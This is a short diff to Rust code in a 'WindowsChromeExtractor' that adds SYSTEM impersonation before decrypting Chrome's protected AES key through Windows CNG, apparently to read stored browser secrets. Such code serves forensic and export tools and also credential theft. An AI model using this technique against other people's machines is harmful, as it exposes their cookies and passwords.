@@ -662,7 +662,11 @@ impl WindowsChromeExtractor {
                         )
                     })?;
 
-                let decrypted_aes_key = self.decrypt_with_cng(encrypted_aes_key)?;
+                debug!("Impersonating SYSTEM to access CNG key");
+                let decrypted_aes_key = {
+                    let _guard = ImpersonationGuard::new()?;
+                    self.decrypt_with_cng(encrypted_aes_key)?
+                };
 
                 let xored_aes_key = self.byte_xor(&decrypted_aes_key, &xor_key);
                 let cipher = Aes256Gcm::new_from_slice(&xored_aes_key)
